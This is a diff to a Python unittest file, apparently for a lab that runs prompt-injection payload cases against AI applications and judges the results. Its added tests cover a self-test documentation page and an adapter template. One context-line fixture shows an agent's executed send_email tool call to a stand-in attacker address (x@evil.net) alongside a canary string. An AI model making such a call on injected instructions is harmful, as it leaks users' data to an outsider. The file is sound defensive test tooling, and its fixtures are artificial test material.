@@ -132,6 +132,28 @@ class Documentation(unittest.TestCase):
         self.assertEqual(linked, set(CASES))
 
 
+class SelfTestPage(unittest.TestCase):
+    PAGE = Path(__file__).resolve().parent.parent / "test-your-own-app.md"
+
+    def test_every_payload_case_has_a_section(self):
+        headings = set(re.findall(r"^### (TC-[A-Z]\d\d-\d{3}) ", self.PAGE.read_text(), re.M))
+        self.assertEqual(headings, set(CASES))
+
+    def test_product_evaluation_language_appears_only_in_the_translation_table(self):
+        text = self.PAGE.read_text()
+        start = text.index("## How the wording changes")
+        end = text.index("## Common setup")
+        outside = text[:start] + text[end:]
+        intro = outside.split("## Common setup")[0]
+        body = outside[len(intro):]
+        for word in ("platform", "vendor", "PoC", "SLA", "tenant of the provider"):
+            self.assertNotRegex(body, rf"\b{word}\b", word)
+
+    def test_commands_on_the_page_name_real_cases(self):
+        for cid in re.findall(r"handle_unprotected (TC-[A-Z]\d\d-\d{3})", self.PAGE.read_text()):
+            self.assertIn(cid, CASES)
+
+
 class Judging(unittest.TestCase):
     def test_forbidden_tool_and_call_and_output(self):
         resp = {"output": "hello CANARY-1", "tool_calls": [{"tool": "send_email", "args": {"to": "x@evil.net"}, "decision": "executed"}]}
@@ -291,6 +313,15 @@ class OverHttp(LabFixture):
         finally:
             server.shutdown()
             server.server_close()
+
+
+class AdapterTemplate(unittest.TestCase):
+    def test_template_reports_not_applicable_rather_than_a_pass(self):
+        import adapter_template
+        case = CASES["TC-L06-014"]
+        run = rc.run_case(adapter_template.handle, case, rc.DEFAULT_SINK, "/x", rc.DEFAULT_MAP)
+        v = rc.verdict(case, run, rc.run_case(adapter_template.handle_unprotected, case, rc.DEFAULT_SINK, "/x", rc.DEFAULT_MAP))
+        self.assertEqual(v["verdict"], "INCONCLUSIVE")
 
 
 class CommandLine(LabFixture):
